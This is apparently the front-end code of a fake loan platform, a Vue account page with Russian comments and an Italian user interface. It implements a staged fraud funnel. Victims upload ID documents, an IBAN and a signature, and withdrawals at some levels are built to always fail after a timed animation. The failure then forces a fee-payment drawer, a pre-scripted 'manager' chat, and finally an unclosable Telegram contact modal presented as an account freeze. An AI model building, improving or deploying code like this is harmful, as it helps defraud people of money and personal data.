<script setup lang="ts">
import { computed, onBeforeUnmount, onMounted, provide, ref, watch, type Component } from 'vue'
import { useI18n } from 'vue-i18n'
import { useSessionStorage, useTimeoutFn } from '@vueuse/core'
import { useAccount } from '@/composables/useAccount'
import { useCommission } from '@/composables/useCommission'
import { useCpiBuild } from '@/composables/useCpiBuild'
import { useAccountStore } from '@/stores/account.store'
import { useDossierStore } from '@/stores/dossier.store'
import { useSimulatorStore } from '@/stores/simulator.store'
import { isApiEnabled, saveLoanTermMonthsToProfile } from '@/api/account.api'

import VelAccount from '@/features/account/VelAccount.vue'
import VelPayoutCard from '@/features/account/VelPayoutCard.vue'
import VelPayoutPanel from '@/features/account/VelPayoutPanel.vue'
import { OPEN_COMMISSION_KEY, PAYOUT_PANEL_KEY } from '@/features/account/payout-panel'
import VelBankNoticeDialog from '@/features/account/VelBankNoticeDialog.vue'
import VelWithdrawAmountDialog from '@/features/account/VelWithdrawAmountDialog.vue'
import VelCommissionDrawer from '@/features/account/VelCommissionDrawer.vue'
import VelBankAuthorizing from '@/features/account/VelBankAuthorizing.vue'
import VelDocumentUpload from '@/features/account/VelDocumentUpload.vue'
import VelContractCard from '@/features/account/VelContractCard.vue'
import VelContractSheet from '@/features/account/VelContractSheet.vue'
import VelContractIban from '@/features/account/VelContractIban.vue'
import VelSignaturePad from '@/features/account/VelSignaturePad.vue'
import VelPdfDialog from '@/features/account/VelPdfDialog.vue'
import VelLevelTransition from '@/features/account/VelLevelTransition.vue'
import VelSuspensionCard from '@/features/account/VelSuspensionCard.vue'
import VelPolicyBuildCard from '@/features/account/VelPolicyBuildCard.vue'
import VelTransferAnim from '@/features/account/VelTransferAnim.vue'
import VelL4UnlockAnim from '@/features/account/VelL4UnlockAnim.vue'
import VelAccountFreezeModal from '@/features/account/VelAccountFreezeModal.vue'
import VelAccountFreezeIntro from '@/features/account/VelAccountFreezeIntro.vue'
import VelRejectFlash from '@/features/account/VelRejectFlash.vue'
import VelStageSwitch from '@/features/account/VelStageSwitch.vue'
import VelLoanDetails from '@/features/account/VelLoanDetails.vue'
import VelDevCommissionBar from '@/features/account/VelDevCommissionBar.vue'
import VelTransferSuccess from '@/features/account/VelTransferSuccess.vue'
import VelAccountToast from '@/features/account/VelAccountToast.vue'
import VelAgentToast from '@/features/account/VelAgentToast.vue'
import VelWaitingAdmin from '@/features/account/VelWaitingAdmin.vue'
import { useCabinetTab } from '@/composables/useCabinetTab'
import { useNotices } from '@/composables/useNotices'
import { useAgentNotify } from '@/composables/useAgentNotify'
import { useSupportChat } from '@/composables/useSupportChat'

const { t } = useI18n()
const account = useAccountStore()
const dossier = useDossierStore()
const simulator = useSimulatorStore()
const { steps, canWithdraw, isAuthorizing, approvedAmount } = useAccount()
const {
  isPayFee,
  isMessenger,
  isWaiting,
  isAnimating,
  isSuspended,
  isPolicyBuild,
  isFailed,
  isTgFinal,
  isRejectAnim,
  isReady,
  phase,
  level,
  beginWithdraw,
  openFeeFromSuspension,
} = useCommission()
const { certViewed, step: cpiStep } = useCpiBuild()
const { select: selectTab } = useCabinetTab()
const notices = useNotices()
/** Toast менеджера / system — shared с pushAgentMessage (admin → toast + badge). */
const {
  open: agentToastOpen,
  kind: agentToastKind,
  show: showAgentNotify,
  hide: hideAgentNotify,
} = useAgentNotify()
/**
 * Shared chat: must be created in setup (useI18n).
 * Never first-call from async/click — that throws «Must be called at top of setup».
 */
const supportChat = useSupportChat()

const apiError = ref<string | null>(null)
let accountSyncTimer: number | null = null
const ACCOUNT_SYNC_INTERVAL_MS = 12_000

function syncProfileTermToBackend(): void {
  if (!isApiEnabled()) return

  const termMonths = Number(simulator.termMonths ?? 0)
  if (!Number.isFinite(termMonths) || termMonths <= 0) return

  void saveLoanTermMonthsToProfile(termMonths)
}

async function syncAccountNow(): Promise<void> {
  if (!isApiEnabled()) return
  /*
   * pullAccount → hydrate: воронка waiting/animating сохраняется в store
   * (см. hydrate CLIENT_FUNNEL_PHASES). Не пропускаем sync целиком —
   * уровень/сумма с бека всё равно нужны.
   */
  await dossier.pullAccount()
  apiError.value = null
}

function stopAccountSync(): void {
  if (accountSyncTimer === null) return
  window.clearInterval(accountSyncTimer)
  accountSyncTimer = null
}

function startAccountSync(): void {
  stopAccountSync()
  accountSyncTimer = window.setInterval(() => {
    if (document.visibilityState !== 'visible') return
    void syncAccountNow()
  }, ACCOUNT_SYNC_INTERVAL_MS)
}

function onCabinetVisible(): void {
  if (document.visibilityState !== 'visible') return
  void syncAccountNow()
}
/** Полноэкранный крестик при L2 freeze / L4 reject — сам закрывается. */
const rejectFlashOpen = ref(false)

/** Приветствие менеджера — один раз за сессию браузера (сразу, не 15 с). */
const welcomeToastSeen = useSessionStorage('velora:cabinet:welcome-manager-toast', false)

onMounted(() => {
  /*
   * Старт всегда Home — не «кидать» на chat (остаточный ?tab=support /
   * messenger watch). Welcome — сразу 2 пузыря + toast.
   */
  selectTab('home')
  if (!welcomeToastSeen.value) {
    queueMicrotask(() => showWelcomeManagerToast())
  }

  if (!isApiEnabled()) return
  void syncAccountNow()
  syncProfileTermToBackend()
  startAccountSync()
  document.addEventListener('visibilitychange', onCabinetVisible)
})


onBeforeUnmount(() => {
  stopAccountSync()
  document.removeEventListener('visibilitychange', onCabinetVisible)
})

/** Contratto PDF template (BASE_URL только в script — в template import.meta ломает prod build). */
const contractPdfTemplate = `${import.meta.env.BASE_URL}cpi/cpi-contract.pdf`
const contractPdfUrl = contractPdfTemplate
/* payoutOpen убран: форма — выпадающая VelPayoutPanel под балансом */
/** Этап 2: «данные в банк, 5–10 мин» до 7-минутной анимации. */
const bankNoticeOpen = ref(false)
/** Сумма вывода (ползунок) → затем drawer комиссии. */
const amountOpen = ref(false)
const withdrawAmount = ref(0)
const commissionOpen = ref(false)
/** Прогрузка с логотипом Velora при смене этапа (L1→L2…). */
const levelTransitionOpen = ref(false)
/** Выпадающая панель метода (не модалка) под Preleva. */
const payoutPanelOpen = ref(false)
provide(PAYOUT_PANEL_KEY, payoutPanelOpen)
/* IBAN и подпись — отдельно (бриф, фотка 4): сначала счёт, потом росчерк. */
const contractIbanOpen = ref(false)
const contractSignOpen = ref(false)
/** Prestito → модалка Dati personali + Piano di ammortamento */
const loanOpen = ref(false)

function openLoan(): void {
  loanOpen.value = true
}
const chosenFiles = ref<File[]>([])
/** Короткий toast «messaggio inviato» / «documenti pronti». */
const toastText = ref<string | null>(null)

const TOAST_MS = 2800

/*
 * Таймер из VueUse, а не голый setTimeout: useTimeoutFn снимает его сам при
 * размонтировании (tryOnScopeDispose внутри) — тот же приём, что в
 * VelStepFinalizing.vue и VelCopyRow.vue.
 *
 * Здесь это не только правило стиля. Прежняя запись держала таймер в let и
 * гасила его ТОЛЬКО при следующем toast: уйди человек с кабинета в первые
 * 2.8 с после сообщения — колбэк дожил бы до конца и записал toastText уже
 * снятого компонента. Повторный вызов start() перезапускает один и тот же
 * таймер, поэтому ручное clearTimeout перед показом больше не нужно.
 */
const { start: hideToastLater } = useTimeoutFn(
  () => {
    toastText.value = null
  },
  TOAST_MS,
  { immediate: false },
)

function showToast(message: string): void {
  toastText.value = message
  hideToastLater()
}

/**
 * Документы приняты (для Firma / пульса IBAN).
 *
 * НЕ смотрим chosenFiles: файлы выбирают до checking — иначе IBAN пульсирует
 * ещё во время анимации «Documento verificato». Только после verified
 * (documentsUploaded / step done / уже на Firma).
 */
const documentsReady = computed(() => {
  if (account.documentsUploaded === true) return true
  if (account.completed.includes('documents')) return true

  const docs = steps.value.find((step) => step.id === 'documents')
  if (docs?.status === 'done') return true

  /* Уже на Firma / подписан — документы позади. */
  const sig = steps.value.find((step) => step.id === 'signature')
  if (sig?.status === 'current' || sig?.status === 'done') return true
  if (account.currentStep === 'signature') return true
  if (account.contractSigned) return true

  return false
})

function unlockFirmaAfterDocs(): void {
  account.documentsUploaded = true
  account.markDone('documents')
  account.advanceTo('signature')
}

/**
 * Welcome сразу (фотка 4): 2 пузыря Deborah.
 * Один toast + один notice; badge = 2 непрочитанных (пока не открыли Assistenza).
 */
function showWelcomeManagerToast(): void {
  if (welcomeToastSeen.value) return
  welcomeToastSeen.value = true
  /* silent: только лента — без 2× toast/notice */
  supportChat.pushAgentMessage(t('account.support.chat.welcomeMsg'), {
    silent: true,
  })
  supportChat.pushAgentMessage(t('account.support.chat.welcomeMsg2'), {
    silent: true,
  })
  /* Один badge + один toast + одно уведомление (не ×3). */
  account.bumpSupportUnread(2)
  try {
    notices.push('managerMessage')
  } catch {
    /* storage */
  }
  showAgentNotify('welcome')
}

/**
 * Системный toast после оплаты+сообщения (L4/воронка waiting).
 * Не уводит с чата сам — только по клику → Home + короткая прогрузка.
 */
function showSystemWaitingToast(): void {
  showAgentNotify('system')
}

/** Только после verify (не при выборе файла) — unlock firma + agent msg (toast+badge). */
function onDocumentsVerified(): void {
  unlockFirmaAfterDocs()
  notices.push('documentVerified')
  showToast(t('account.docs.toastReady'))
  /* toast + badge + notice — внутри pushAgentMessage */
  supportChat.pushAgentMessage(t('account.support.chat.docsVerified'))
}

function onAgentToastOpen(): void {
  hideAgentNotify()
  if (agentToastKind.value === 'system') {
    /* Home + полноэкранная прогрузка (как смена этапа). */
    selectTab('home')
    levelTransitionOpen.value = true
    window.setTimeout(() => {
      levelTransitionOpen.value = false
    }, 2000)
    return
  }
  /* agent / welcome → чат с менеджером (badge гасится в VelAccount watch tab) */
  selectTab('support')
}

function onAgentToastClose(): void {
  hideAgentNotify()
}

function onContractSignConfirm(dataUrl: string): void {
  /* Подпись сразу в стор → лист договора рисует PNG. */
  account.markContractSigned(new Date(), dataUrl)
  account.markDone('signature')
  /* Все 5 кружков step bar → done (каскад галочек в VelTrackerRow). */
  for (const id of ['simulation', 'approval', 'account', 'documents', 'signature'] as const) {
    account.markDone(id)
  }
  showToast(t('account.contract.toastSigned'))
}

/*
 * Все 5 шагов step bar закрыты (обычно после Firma) → toast + badge Assistenza.
 * Только переход false → true: не дублируем при reload с уже готовым ЛК.
 * Notice «contractSigned» уже пушит useNotices при markContractSigned.
 */
/*
 * allDone больше не шлёт фейковый managerMessage / badge:
 * иначе 3 уведомления «от консультанта» при 1 реальном сообщении (фотка 3).
 */


function openContractIban(): void {
  contractIbanOpen.value = true
}

function openContractSign(): void {
  const hasIban =
    Boolean(account.ibanProvided) || account.ibanFull.trim() !== '' || account.ibanMasked.trim() !== ''
  /* Firma disabled без IBAN на карточке; страховка на случай вызова сбоку. */
  if (!hasIban) {
    contractIbanOpen.value = true
    return
  }
  contractSignOpen.value = true
}

/**
 * L2 полный флоу (offline):
 *  1) Preleva
 *  2) Панель → Avvia il trasferimento
 *  3) Модалка «Dati inviati alla banca» → Continua
 *  4) Анимация + таймер 7 минут
 *  5) suspended (ошибка вывода)
 *  6) Модалка/drawer оплаты комиссии
 *  7) «Оплатил» → чат с заготовкой → waiting → админ L3
 *
 * L4: 1–2 → сразу анимация (без шага 3) → tg_final.
 */
function startWithdrawFunnel(): void {
  selectTab('home')
  payoutPanelOpen.value = false
  successOpen.value = false

  const lv = normalizeLevel()

  if (lv === 2) {
    /* Шаг 3: bank-notice. Анимация — только после Continua. */
    bankNoticeOpen.value = true
    return
  }

  if (lv === 4) {
    bankNoticeOpen.value = false
    beginWithdraw()
    return
  }

  beginWithdraw()
}

/**
 * Сумма для drawer: после L2-анимации ref может быть 0 (F5 / другой вход).
 * Берём одобренный кредит — не гоняем снова в Preleva.
 */
function ensureWithdrawAmount(): void {
  if (withdrawAmount.value > 0) return
  const approved = Math.round(approvedAmount.value)
  if (approved > 0) withdrawAmount.value = approved
}

/** pay_fee / «Paga la copertura»: сразу drawer комиссии, без Preleva. */
function openCommissionPayment(): void {
  ensureWithdrawAmount()
  payoutPanelOpen.value = false
  commissionOpen.value = true
}

provide(OPEN_COMMISSION_KEY, openCommissionPayment)

/*
 * «Trasferimento completato» — только реальный успех (не L2/L4).
 * Объявлен здесь: openL2CommissionAuto / watch'и гасят его до template.
 */
const successOpen = ref(false)

/**
 * Preleva — повторный вход после 1-й попытки (pay_fee / messenger / suspended).
 * Раньше кнопка гасла навсегда: phase ≠ ready, а onWithdraw выходил сразу.
 */
function onWithdraw(): void {
  if (!canWithdraw.value) return

  /* Уже в оплате комиссии — снова drawer (закрыли без оплаты). */
  if (isPayFee.value) {
    openCommissionPayment()
    return
  }

  /* L4 финал (tg_final): вывод заблокирован — только Telegram. */
  if (isTgFinal.value) {
    return
  }

  /* После оплаты: продолжить в чате с менеджером. */
  if (isMessenger.value) {
    selectTab('support')
    return
  }

  /* Waiting: остаёмся на Home — карточка «ожидайте инструкций». */
  if (isWaiting.value) {
    selectTab('home')
    return
  }

  /* L2 страховка: pay_fee → сразу комиссия (не Preleva). */
  if (isSuspended.value) {
    openFeeFromSuspension()
    openCommissionPayment()
    return
  }

  /* Анимация / policy / отказ — кнопки нет (VelPayoutCard.withdrawLocked). */
  if (!isReady.value) return

  /*
   * Панель уже открыта: повторный Preleva = подтвердить (IBAN есть) и
   * запустить воронку — НЕ просто свернуть (на L4 из‑за этого «ничего»).
   */
  if (payoutPanelOpen.value) {
    const hasIban = account.ibanFull.trim() !== '' || account.ibanProvided
    if (hasIban) {
      ensureWithdrawAmount()
      const euros =
        withdrawAmount.value > 0
          ? withdrawAmount.value
          : Math.round(approvedAmount.value)
      if (euros > 0) {
        continueAfterPayout(euros)
        return
      }
    }
    /* Форма не готова — оставляем панель открытой */
    return
  }
  payoutPanelOpen.value = true
}

/** После «Avvia» в панели → drawer (L1/L3) или анимация вывода (L2/L4). */
function continueAfterPayout(euros: number): void {
  withdrawAmount.value = Math.max(0, Math.round(euros))
  if (withdrawAmount.value <= 0) {
    ensureWithdrawAmount()
  }
  payoutPanelOpen.value = false

  const lv = normalizeLevel()

  // L1 / L3 / страховка: pay_fee → drawer
  if (lv === 1 || lv === 3 || isSuspended.value) {
    if (!isPayFee.value) beginWithdraw()
    commissionOpen.value = true
    return
  }

  // L2 → bank-notice → анимация → авто-отказ; L4 → анимация → авто-отказ
  startWithdrawFunnel()
}

function normalizeLevel(): number {
  const n = Number(level.value)
  return Number.isFinite(n) && n >= 1 && n <= 4 ? n : 1
}

function onPayoutSubmitted(euros: number): void {
  continueAfterPayout(euros)
}

function onAmountConfirm(): void {
  amountOpen.value = false
  if (isPayFee.value) {
    commissionOpen.value = true
    return
  }
  startWithdrawFunnel()
}

/**
 * L2 шаг 3→4: «Continua» на «Dati inviati alla banca» → анимация (таймер 7 мин).
 * Анимация offline; по timer=0 → suspended.
 */
function onBankNoticeContinue(): void {
  bankNoticeOpen.value = false
  selectTab('home')
  if (isAnimating.value) return
  beginWithdraw()
}

/**
 * L2: после отказа анимации — drawer оплаты САМ (без клика «Paga…»).
 * Карточка suspended остаётся как fallback, если drawer закрыли.
 */
function openL2CommissionAuto(): void {
  if (Number(level.value) !== 2) return
  if (!isSuspended.value && !isPayFee.value) return
  selectTab('home')
  successOpen.value = false
  if (isSuspended.value) openFeeFromSuspension()
  openCommissionPayment()
}

/**
 * L2 шаг 7: «Conferma pagamento» → messenger + Assistenza + заготовка.
 * (confirmFeePaid / markFeePaidOffline уже в drawer — phase = messenger.)
 */
function onCommissionConfirmed(): void {
  commissionOpen.value = false
  selectTab('support')
  void import('vue').then(({ nextTick }) =>
    nextTick(() => {
      supportChat.seedFunnelDraft(true)
    }),
  )
}

/**
 * pay_fee → drawer. Не закрываем drawer при уходе с pay_fee, если
 * пользователь просто dismiss — закрытие только в onCommissionConfirmed /
 * messenger watch (иначе гонка с auto-open).
 */
watch(isPayFee, (on) => {
  if (!on) return
  openCommissionPayment()
})

/**
 * L2 после 7‑мин таймера: suspended → reject flash → auto drawer комиссии.
 * Два триггера: (1) вход в suspended, (2) закрытие reject flash — чтобы
 * модалка точно вылезла без клика «Paga la copertura».
 */
watch(isSuspended, (on, was) => {
  if (!(on && was === false)) return
  if (Number(level.value) !== 2) return
  selectTab('home')
  successOpen.value = false
  /* ~reject flash 1.4s + кадр — drawer поверх карточки */
  window.setTimeout(() => openL2CommissionAuto(), 1_650)
})

watch(rejectFlashOpen, (open, wasOpen) => {
  if (open || wasOpen !== true) return
  if (Number(level.value) !== 2) return
  if (!isSuspended.value && !isPayFee.value) return
  /* Flash ушёл — сразу оплата, без клика по красной кнопке */
  openL2CommissionAuto()
})

/** После оплаты → Assistenza + заготовка (L1…L4). */
watch(isMessenger, (needChat) => {
  if (!needChat) return
  commissionOpen.value = false
  selectTab('support')
  void import('vue').then(({ nextTick }) =>
    nextTick(() => {
      supportChat.seedFunnelDraft(true)
    }),
  )
})

/*
 * Waiting после заготовки L1: Home + VelWaitingAdmin + Preleva locked.
 * Toast sistema — доп. подсказка.
 */
watch(isWaiting, (waiting, was) => {
  if (!(waiting && was === false)) return
  selectTab('home')
  commissionOpen.value = false
  payoutPanelOpen.value = false
  showSystemWaitingToast()
})

/** PDF в модалке: шаблон + ФИО/сумма/IBAN/подпись как на старом проде. */
const pdfOpen = ref(false)

function onOpenPdf(): void {
  /* Чистая модалка с бланком + ФИО (без PDF toolbar / печати). */
  pdfOpen.value = true
}

/*
 * ФИНАЛ ПЕРЕВОДА.
 *
 * Ловим не «прогресс дошёл до единицы», а сам выход из фазы animating: фазу
 * может закрыть и оператор со своей стороны, и тогда прогресс до конца не
 * доедет, а перевод всё равно завершён.
 *
 * Окно живёт ЗДЕСЬ, а не внутри VelTransferAnim: как только фаза сменилась,
 * тот экран размонтируется, и финал ушёл бы вместе с ним, не успев показаться.
 *
 * L2 / L4 всегда кончаются отказом (таймер → suspended / tg_final):
 * зелёный success здесь = баг.
 */
watch(isAnimating, (now, was) => {
  if (!was || now) return
  /* L2/L4: никогда success — только отказ по таймеру */
  if (level.value === 2 || level.value === 4) {
    successOpen.value = false
    return
  }
  if (isSuspended.value || isFailed.value || isTgFinal.value || isRejectAnim.value) {
    successOpen.value = false
    return
  }
  successOpen.value = true
})

/* Если phase уже reject — гасим success, даже если успел открыться */
watch(
  () => isSuspended.value || isFailed.value || isTgFinal.value || isRejectAnim.value,
  (reject) => {
    if (reject) successOpen.value = false
  },
)

/*
 * Конец анимации L2/L4: полноэкранный крестик «вылетает» и через ~1.4 с уходит.
 * isRejectAnim = true в hold 100% и в suspended/failed.
 */
watch(isRejectAnim, (now, was) => {
  if (now && was === false) {
    rejectFlashOpen.value = true
  }
})

const showClassicBank = computed(
  () => isAuthorizing.value && !isAnimating.value && !isSuspended.value && !isFailed.value,
)

/**
 * L4 после отказа: красная сцена вывода остаётся на фоне (tg_final / freeze / TG).
 */
const showL4RejectScene = computed(
  () => level.value === 4 && (isTgFinal.value || isFailed.value || isRejectAnim.value),
)

/**
 * L2: карточка «Paga» остаётся на suspended И на pay_fee (закрыли drawer
 * без оплаты — CTA не исчезает, пока не оплатили и не написали менеджеру).
 */
const showL2SuspensionCard = computed(
  () => level.value === 2 && (isSuspended.value || isPayFee.value),
)

/**
 * L3 CPI-карточка на Home: генерация, «готов» и ПОСЛЕ галочки (phase ready).
 * Раньше после markCertViewed phase≠policy_build → карточка пропадала.
 */
const showL3CpiCard = computed(() => {
  if (level.value !== 3) return false
  if (isAnimating.value || isPayFee.value || isMessenger.value || isWaiting.value) return false
  if (isPolicyBuild.value) return true
  /* После просмотра: phase ready + сертификат выдан — карточка остаётся */
  if (
    isReady.value &&
    (certViewed.value || cpiStep.value === 'viewed' || cpiStep.value === 'ready')
  ) {
    return true
  }
  return false
})

/**
 * L4 до Preleva: intro canvas «sblocco fondi».
 * После Preleva → isAnimating → VelTransferAnim (come L2).
 */
const showL4UnlockIntro = computed(
  () =>
    Number(level.value) === 4 &&
    isReady.value &&
    !isAnimating.value &&
    !isTgFinal.value &&
    !isFailed.value &&
    !isRejectAnim.value,
)

const transferStage = computed((): { key: string; view: Component } | null => {
  if (isAnimating.value) return { key: `anim-${phase.value}`, view: VelTransferAnim }
  if (showL2SuspensionCard.value) return { key: 'suspended', view: VelSuspensionCard }
  /* L4 ready: intro unlock (finché non preme Preleva) */
  if (showL4UnlockIntro.value) return { key: 'l4-unlock', view: VelL4UnlockAnim }
  /* После сообщения менеджеру: «ожидайте инструкций» + hourglass на Preleva. */
  if (isWaiting.value) return { key: 'waiting', view: VelWaitingAdmin }
  /* L4 tg_final / failed: красная VelTransferAnim ниже (не success-карточка) */
  if (isFailed.value || isTgFinal.value) return null
  if (showClassicBank.value) return { key: 'bank', view: VelBankAuthorizing }
  // L3 CPI (loading / ready / viewed) — не только policy_build
  if (showL3CpiCard.value) {
    return { key: `cpi-${cpiStep.value}-${phase.value}`, view: VelPolicyBuildCard }
  }
  // L1/L3 pay_fee → VelCommissionDrawer (оверлей), не карточка на Home
  // messenger L1–L3 — чат Assistenza; Preleva locked + busy «In elaborazione»
  return null
})

/**
 * L4 tg_final:
 *  · первый раз (после анимации) — intro заморозки, затем TG-модалка;
 *  · возврат с лендинга / F5 / remount — модалка СРАЗУ (без intro).
 */
const freezeIntroOpen = ref(false)
const freezeOpen = ref(false)

const freezeMode = computed<'reject' | 'telegram'>(() => 'telegram')

/**
 * Финал L4: красная «Contatta il manager»;
 * CTA на карточке мигает, клик снова поднимает TG-модалку.
 */
const tgContactMode = computed(() => isTgFinal.value)

watch(
  isTgFinal,
  (tg) => {
    if (!tg) {
      freezeIntroOpen.value = false
      freezeOpen.value = false
      return
    }

    selectTab('home')

    /*
     * 66.txt §11: после анимации L4 сразу модалка директора — без intro freeze.
     * remount / return from land → modal immediately.
     */
    freezeIntroOpen.value = false
    freezeOpen.value = true
  },
  { immediate: true },
)

function onFreezeIntroDone(): void {
  freezeIntroOpen.value = false
  if (isTgFinal.value) freezeOpen.value = true
}

function onFreezePay(): void {
  /* Legacy: fee 280 снята — no-op */
}

function openFreezeReject(): void {
  /* no-op: reject-pay flow снят */
}

function openFreezeTelegram(): void {
  if (!isTgFinal.value) return
  freezeIntroOpen.value = false
  freezeOpen.value = true
}

/*
 * Dev-пульт L1–L4: по умолчанию ВЫКЛ (уровни задаёт бэкенд).
 * Включить только явно: VITE_SHOW_PHASE_BAR=1 (локальный стенд).
 */
const showDevBar = false
</script>

<template>
  <VelAccount>
    <!-- Баланс на первом плане; loan details — только когда открыт, ниже воронки. -->
    <template #summary>
      <VelPayoutCard
        :panel-open="payoutPanelOpen"
        :tg-contact-mode="tgContactMode"
        @withdraw="onWithdraw"
        @open-loan="openLoan"
        @contact-manager="openFreezeTelegram"
      />
      <!-- Выпадающая форма метода (шаг 1 после Preleva) — не модалка -->
      <VelPayoutPanel
        v-model:open="payoutPanelOpen"
        class="mt-3"
        @submitted="onPayoutSubmitted"
      />
    </template>

    <template #transfer>
      <VelStageSwitch v-if="transferStage" :stage-key="transferStage.key">
        <component :is="transferStage.view" />
      </VelStageSwitch>

      <!--
        L4: красная сцена вывода остаётся под freeze/TG;
        L2 suspended/pay_fee → freeze-сцена под карточкой страховки.
      -->
      <VelTransferAnim
        v-if="showL4RejectScene || showL2SuspensionCard"
        class="mt-4"
        :reject-open="false"
        @open-reject="openFreezeReject"
      />
    </template>

    <template #documents>
      <VelDocumentUpload v-model="chosenFiles" @verified="onDocumentsVerified" />
    </template>

    <template #signature>
      <!-- Один блок: шапка договора + лист (2.png) -->
      <section class="vel-contract-block rounded-panel border border-line bg-surface">
        <VelContractCard
          :pdf-url="contractPdfUrl"
          :documents-ready="documentsReady"
          :iban-provided="Boolean(account.ibanProvided) || account.ibanFull.trim() !== ''"
          :signed="account.contractSigned"
          @sign="openContractSign"
          @open-pdf="onOpenPdf"
          @enter-iban="openContractIban"
        />
        <div class="mt-4 border-t border-line pt-4">
          <VelContractSheet />
        </div>
      </section>
    </template>

    <!-- side: personal data / docs убраны с Home — только Profilo / Documenti -->
  </VelAccount>

  <VelBankNoticeDialog v-model:open="bankNoticeOpen" @continue="onBankNoticeContinue" />
  <VelWithdrawAmountDialog
    v-model:open="amountOpen"
    v-model:amount="withdrawAmount"
    @confirm="onAmountConfirm"
  />
  <VelCommissionDrawer
    v-model:open="commissionOpen"
    @confirmed="onCommissionConfirmed"
  />
  <!-- IBAN отдельно, подпись (только росчерк) отдельно -->
  <VelContractIban v-model:open="contractIbanOpen" />
  <VelSignaturePad v-model:open="contractSignOpen" @confirm="onContractSignConfirm" />

  <!-- Apri PDF: полный Contratto di credito al consumo (тот же лист, что на Documenti) -->
  <VelPdfDialog
    v-model:open="pdfOpen"
    name-mode="none"
    :title="t('contract.preview.title')"
  >
    <VelContractSheet />
  </VelPdfDialog>

  <!-- Prestito: модалка с 2 блоками (Dati personali + ammortamento) -->
  <VelLoanDetails v-model:open="loanOpen" />

  <!-- L1→L2 (и дальше): полноэкранная прогрузка с логотипом Velora -->
  <VelLevelTransition v-model:open="levelTransitionOpen" :level="level" />

  <!-- Полноэкранный финал перевода: сам уходит по таймеру, закрывается по Esc -->
  <VelTransferSuccess v-model:open="successOpen" />

  <!-- Dev-пульт L1–L4: только VITE_SHOW_PHASE_BAR=1. Прод — уровни с бека. -->
  <VelDevCommissionBar v-if="showDevBar" />

  <VelAccountToast :text="toastText" />

  <VelAgentToast
    :open="agentToastOpen"
    :variant="agentToastKind"
    @open="onAgentToastOpen"
    @close="onAgentToastClose"
  />

  <!-- L2: крестик на весь экран → сам закрывается -->
  <VelRejectFlash v-model:open="rejectFlashOpen" />

  <!-- L4: заморозка счёта → затем TG-модалка -->
  <VelAccountFreezeIntro v-model:open="freezeIntroOpen" @done="onFreezeIntroDone" />

  <!-- L4 tg_final: Telegram (после intro или сразу при возврате), нельзя закрыть -->
  <VelAccountFreezeModal
    v-model:open="freezeOpen"
    :mode="freezeMode"
    :persistent="isTgFinal"
    @pay="onFreezePay"
  />
</template>

<style scoped>
/* Единый блок договора: убираем вторую рамку у карточки внутри */
.vel-contract-block {
  min-inline-size: 0;
  padding: var(--vel-cab-card-pad, 1rem);
}

.vel-contract-block :deep(.vel-contract-card) {
  padding: 0;
  border: none;
  background: transparent;
  box-shadow: none;
}
</style>
